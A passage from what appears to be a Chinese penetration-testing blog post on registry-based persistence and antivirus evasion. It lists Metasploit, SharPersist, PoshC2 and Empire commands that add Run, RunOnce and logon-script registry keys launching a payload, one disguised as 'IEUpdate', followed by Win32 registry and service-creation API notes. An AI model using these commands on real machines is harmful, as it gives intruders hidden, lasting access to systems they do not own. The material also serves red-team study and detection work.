class="hljs-number">0</span>.<span class="hljs-number">2</span>.<br><br><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145751907.png" srcset="/img/loading.gif" lazyload alt="image-20211225145751907"></p><p>Metasploit – Meterpreter持久性脚本</p><p>用户下次登录系统时，将打开一个新的Meterpreter会话。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145808681.png" srcset="/img/loading.gif" lazyload alt="image-20211225145808681"></p><p>Metasploit – Meterpreter会话</p><p>另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系</p><p>统上的可写位置</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gams">use post/windows/manage/persistence_exe<br><br><span class="hljs-keyword">set</span> REXEPATH /tmp/<span class="hljs-comment">pentestlab.exe</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SESSION 2</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">STARTUP USER</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">LOCALEXEPATH C:\\tmp</span><br><br>run<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145836598.png" srcset="/img/loading.gif" lazyload alt="image-20211225145836598"></p><p>Metasploit –持久性利用后开发模块配置</p><p>由于已选择<strong>USER</strong>作为选项，该模块将使用当前用户的注册表位置</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145851974.png" srcset="/img/loading.gif" lazyload alt="image-20211225145851974"></p><p>Metasploit –持久性后期开发模块</p><p>如果已获得系统级别的特权，则可以将该模块配置为在<strong>HKLM</strong>位置中创建注册表项。该<strong>STARTUP</strong>选项</p><p>将需要改变系统。</p><p>Metasploit –作为系统的持久性模块</p><p>set STARTUP SYSTEM</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150021595.png" srcset="/img/loading.gif" lazyload alt="image-20211225150021595"></p><p><strong>SharPersist</strong></p><p>SharPersist是Brett Hawkins在C＃中开发的工具，它结合了多种持久性技术，包括添加注册表运行</p><p>键。该工具包可以加载到支持反射加载的各种命令和控制框架中，例如Cobalt Strike和PoshC2。以下</p><p>命令将创建一个注册表项，该注册表项将从与Metasploit Framework模块相同的注册表位置执行任意</p><p>有效负载。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c</span><br><br>C:\tmp\pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hkcurun<span class="hljs-string">&quot; -v &quot;</span>pentestlab<span class="hljs-comment">&quot; -m add</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150102381-164041566314418.png" srcset="/img/loading.gif" lazyload alt="image-20211225150102381"></p><p>SharPersist –以用户身份注册</p><p>如果已获得提升的访问权限，请修改命令以在本地计算机位置中安装注册表项，以实现所有用户的持久</p><p>性。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c</span><br><br>C:\tmp\pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hklmrun<span class="hljs-string">&quot; -v &quot;</span>pentestlab<span class="hljs-comment">&quot; -m add -o env</span><br></code></pre></td></tr></table></figure><p>SharPersist –注册为SYSTEM</p><p>SharPersist还通过<strong>RunOnce</strong>和<strong>RunOnceEx</strong>注册表项包含持久性功能。以下命令将在这些位置创建注</p><p>册表项，这些注册表项将执行任意有效负载。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hklmrunonce<span class="hljs-string">&quot; -v &quot;</span>Pentestlab<span class="hljs-comment">&quot; -m add </span><br><br>SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hklmrunonceex<span class="hljs-string">&quot; -v &quot;</span>Pentestlab<span class="hljs-comment">&quot; -m add </span><br><br>SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>hkcurunonce<span class="hljs-string">&quot; -v &quot;</span>Pentestlab<span class="hljs-comment">&quot; -m add</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150141799.png" srcset="/img/loading.gif" lazyload alt="image-20211225150141799"></p><p>SharPersist – RunOnce注册表项</p><p>SharPersist还提供了使用另一个注册表位置进行持久化的选项（<strong>UserInitMprLogonScript</strong>）。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">SharPersist -t <span class="hljs-keyword">reg</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span> -<span class="hljs-keyword">a</span> <span class="hljs-comment">&quot;/c </span><br><br>pentestlab.<span class="hljs-keyword">exe</span><span class="hljs-string">&quot; -k &quot;</span>logonscript<span class="hljs-comment">&quot; -m add</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150216295.png" srcset="/img/loading.gif" lazyload alt="image-20211225150216295"></p><p><strong>PoshC2</strong></p><p>PoshC2支持各种持久性功能，包括注册表运行键的方法。以下命令将在目标主机中创建两个注册表</p><p>项。</p><p>install-persistence</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150239387.png" srcset="/img/loading.gif" lazyload alt="image-20211225150239387"></p><p>PoshC2 –持久性</p><p>注册表的“运行”项将具有IEUpdate的名称，以便看起来合法，第二个注册表项将作为墙纸隐藏在注册</p><p>表中</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150253132.png" srcset="/img/loading.gif" lazyload alt="image-20211225150253132"></p><p>PoshC2 –注册表运行键</p><p><strong>Empire</strong></p><p>如果将Empire用作命令和控件，Empire包含两个与通过注册表运行项与持久性技术对齐的模块。根据</p><p>特权级别，这些模块将尝试在以下注册表位置中安装base64有效负载：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">HKCU</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug <br><br><span class="hljs-name">HKLM</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150324745.png" srcset="/img/loading.gif" lazyload alt="image-20211225150324745"></p><p>Empire – Debug 注册表项有效负载</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule persistence<span class="hljs-regexp">/userland/</span>registry <br><br>usemodule persistence<span class="hljs-regexp">/elevated/</span>registry* <br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150348696.png" srcset="/img/loading.gif" lazyload alt="image-20211225150348696"></p><p>Empire –Persistence Registry Module</p><p>将在名称<strong>Updater</strong>下创建另一个注册表项，该注册表项将包含要执行的命令。PowerShell将尝试在下</p><p>次登录时运行<strong>Debug</strong>密钥中存储的有效负载，以实现持久性。</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">HKCU</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Run <br><br><span class="hljs-name">HKLM</span>:SOFTWARE\Microsoft\Windows\CurrentVersion\Run <br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225150413416.png" srcset="/img/loading.gif" lazyload alt="image-20211225150413416"></p><p>Empire – Registry Run Key</p><p>参考链接：<a target="_blank" rel="noopener" href="https://pentestlab.blog/">https://pentestlab.blog</a></p><h3 id="七、注册表指令函数功能介绍（c-函数）"><a href="#七、注册表指令函数功能介绍（c-函数）" class="headerlink" title="七、注册表指令函数功能介绍（c#函数）"></a>七、注册表指令函数功能介绍（c#函数）</h3><p>•<strong>REG_SZ</strong>：字符串数据的主要类型，用于存储固定长度的字符串或其他短文本</p><p>值。我们在实际程序中通常只用这种数据类型，如果要保存布尔值时，将它表</p><p>示成0或1。</p><p>• <strong>REG_BINARY</strong>：用于存储二进制数据。</p><p>• <strong>REG_EXPAND_SZ</strong>：可扩展的字符串值，可以保存在运行时才解析的系统变量。</p><p>• <strong>REG_MULTI_SZ</strong>：以数组的格式保存多个文本字符串，每个字符串”元素”都以</p><p>null字符结束</p><p><strong>(1) RegOpenKeyEx****函数</strong></p><p>打开一个指定的注册表键。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">LONG WINAPI RegOpenKeyEx( <br><br>HKEY hKey, <span class="hljs-regexp">//</span>需要打开的主键的名称 <br><br>LPCTSTR lpSubKey, <span class="hljs-regexp">//</span>需要打开的子键的名称 <br><br>DWORD ulOptions, <span class="hljs-regexp">//</span>保留,设为<span class="hljs-number">0</span> <br><br>REGSAM samDesired, <span class="hljs-regexp">//</span>安全访问标记,也就是权限 <br><br>PHKEY phkResult <span class="hljs-regexp">//</span>得到的将要打开键的句柄 <br><br>)<br><br><br></code></pre></td></tr></table></figure><p><strong>(2) RegSetValueEx****函数</strong></p><p>在注册表项下设置指定值的数据和类型。返回零表示成功，返回其他任何值都代</p><p>表一个错误代码。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">LONG RegSetValueEx( <br><br>HKEY hKey, <span class="hljs-regexp">//</span>指定一个已打开句柄或标准项名 <br><br>LPCTSTR lpValueName, <span class="hljs-regexp">//</span>指向一个字符串的指针，该字符串包含设置值的名称 <br><br>DWORD Reserved, <span class="hljs-regexp">//</span>保留值,必须强制为<span class="hljs-number">0</span> <br><br>DWORD dwType, <span class="hljs-regexp">//</span>指定存储的数据类型,如REG_BINARY\REG_DWORD <br><br>CONST BYTE *lpData, <span class="hljs-regexp">//</span>指向一个缓冲区,包含指定名称存储的数据 <br><br>DWORD cbData <span class="hljs-regexp">//</span>指定由lpData参数指向的数据大小 <br><br>)<br></code></pre></td></tr></table></figure><p><strong>SHGetSpecialFolderPath****函数</strong></p><p>获取指定的系统路径。</p><p>BOOL SHGetSpecialFolderPath(</p><p>HWND hwndOwner,</p><p>LPTSTR lpszPath,</p><p>int nFolder,</p><p>BOOL fCreate</p><p>);</p><p><strong>参数</strong>：</p><p>hwndOwner：窗口所有者的句柄</p><p>lpszPath：返回路径的缓冲区，该缓冲区大小至少为MAT_PATHA</p><p>nFolder：系统路径的CSIDL标识</p><p>– CSIDL_BITBUCKET：桌面\回收站</p><p>– CSIDL_CONTROLS：我的电脑\控制面板</p><p>– CSIDL_DESKTOP：桌面</p><p>– CSIDL_DRIVES：我的电脑</p><p>– CSIDL_STARTUP：开始菜单\程序\启动</p><p>– CSIDL_SYSTEM：System文件夹</p><p>– CSIDL_WINDOWS：Windows目录</p><p>• fCreate：指示文件夹不存在时是否要创建，FALSE不创建</p><p><strong>返回值</strong>：</p><p>如果返回TRUE表示执行成功；否则执行失败。</p><p><strong>系统进程自启动是通过创建系统服务并设置服务启动类型为自动启动来实现的，接下来</strong></p><p><strong>我们进行相关介绍。</strong></p><p>**1.**<strong>函数介绍</strong></p><p><strong>(1) OpenSCManager****函数</strong></p><p>建立了一个到服务控制管理器的连接，并打开指定的数据库。如果函数成功，则返回一</p><p>个服务控制管理器数据库的句柄；否则返回NULL。</p><p>SC_HANDLE WINAPI OpenSCManager(</p><p>__in_opt LPCTSTR lpMachineName, &#x2F;&#x2F;指定计算机名称</p><p>__in_opt LPCTSTR lpDatabaseName, &#x2F;&#x2F;指定要打开服务控制管理数据库的名称</p><p>__in DWORD dwDesiredAccess &#x2F;&#x2F;指定服务访问控制管理器的权限</p><p>);</p><p><strong>(2) CreateService****函数</strong></p><p>建立一个服务对象，并将其添加到指定的服务控制管理器数据库中。如果函数成</p><p>功，则返回该服务的句柄；否则返回NULL。</p><p>SC_HANDLE CreateService(</p><p>SC_HANDLE hSCManager, &#x2F;&#x2F;服务控制管理器数据库的句柄</p><p>LPCTSTR lpServiceName, &#x2F;&#x2F;要安装服务的名称</p><p>LPCTSTR lpDisplayName, &#x2F;&#x2F;用户界面标识服务的显示名称</p><p>DWORD dwDesiredAccess, &#x2F;&#x2F;对服务的访问</p><p>DWORD dwServiceType, &#x2F;&#x2F;指定服务类型</p><p>DWORD dwStartType, &#x2F;&#x2F;指定服务启动选项</p><p>DWORD dwErrorControl, &#x2F;&#x2F;指定服务启动失败的严重程度</p><p>LPCTSTR lpBinaryPathName, &#x2F;&#x2F;指定服务程序二进制文件的路径</p><p>LPCTSTR lpLoadOrderGroup, &#x2F;&#x2F;指定顺序装入的服务组名</p><p>LPDWORD lpdwTagId, &#x2F;&#x2F;标记变量</p><p>LPCTSTR lpDependencies, &#x2F;&#x2F;指定启动该服务前必须先启动的服务或服务组</p><p>LPCTSTR lpServiceStartName, &#x2F;&#x2F;该服务应运行的账户名称</p><p>LPCTSTR lpPassword &#x2F;&#x2F;指定账户名的密码</p><p>);</p><p>其中，dwStartType共有五种启动类型。</p><p>前三种类型是 SERVICE_AUTO_START、SERVICE_DISABLED 和</p><p>SERVICE_DEMAND_START。对应的标准启动类型自动、禁用和手动，通常</p><p>使用“计算机管理”管理工具中的“服务”进行配置。</p><p>后两种类型是 SERVICE_BOOT_START 和 SERVICE_SYSTEM_START，</p><p>通常用于配置加载设备驱动程序的方式。25</p><p><strong>(3) OpenService****函数</strong></p><p>打开一个已经存在的服务。如果函数成功，则返回该服务的句柄；否则返回NULL，</p><p>可以通过GetLastError获取错误码。</p><p>SC_HANDLE WINAPI OpenService(</p><p>SC_HANDLE hSCManager, &#x2F;&#x2F;指向SCM数据库句柄</p><p>LPCTSTR lpServiceName, &#x2F;&#x2F;要打开服务的名称</p><p>DWORD dwDesiredAccess &#x2F;&#x2F;指定服务权限</p><p>);</p><p><strong>(4) StartService****函数</strong></p><p>启动服务。如果函数成功，则返回非零数值；否则返回0，可以通过GetLastError</p><p>获取错误码。</p><p>SC_HANDLE WINAPI StartService(</p><p>SC_HANDLE hService, &#x2F;&#x2F;OpenService或CreateService函数返回服务句柄</p><p>DWORD dwNumServiceArgs, &#x2F;&#x2F;下一个形参lpServiceArgVectors字符串个数</p><p>LPCTSTR *lpServiceArgVectors &#x2F;&#x2F;传给服务ServiceMain的参数</p><p>);</p><p><strong>(5) StartServiceCtrlDispatcher****函数</strong></p><p>将服务进程的主线程连接到服务控制管理器，该线程将作为调用过程的服务控制</p><p>分派器线程。如果函数成功，则返回非零数值；否则返回0，可以通过</p><p>GetLastError获取错误码。</p><p>BOOL WINAPI StartServiceCtrlDispatcher（</p><p><em>In</em> const SERVICE_TABLE_ENTRY * lpServiceTable</p><p>)</p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E5%85%8D%E6%9D%80/" class="category-chain-item">免杀</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a></div></div><div class="license-box my-3"><div class="license-title"><div>注册表免杀</div><div>http://example.com/熟悉注册表渗透免杀指令.html</div></div><div class="license-meta"><div class="license-meta-item"><div>Author</div><div>CDxiaodong</div></div><div class="license-meta-item license-meta-date"><div>Posted on</div><div>December 20, 2022</div></div><div class="license-meta-item"><div>Licensed under</div><div><a target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/%E5%88%A9%E7%94%A8hook%E7%BB%95%E8%BF%87windowsdefender%E5%8A%A8%E6%80%81%E6%9F%A5%E6%9D%80.html" title="hooksleep 绕wdf"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">hooksleep 绕wdf</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/shell%20%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91.html" title="shell 编程开发"><span class="hidden-mobile">shell 编程开发</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>CD</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>XD</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">Views: <span id="busuanzi_value_site_pv"></span> </span><span id="busuanzi_container_site_uv" style="display:none">Visitors: <span id="busuanzi_value_site_uv"></span></span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t){var e=Fluid.plugins.typing,i=t.getElementById("subtitle");i&&e&&e(i.getAttribute("data-typed-text"))}((window,document))</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;0<t.find(".toc-list-item").length&&t.css("visibility","visible")}}))})</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script defer src="/js/leancloud.js"></script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>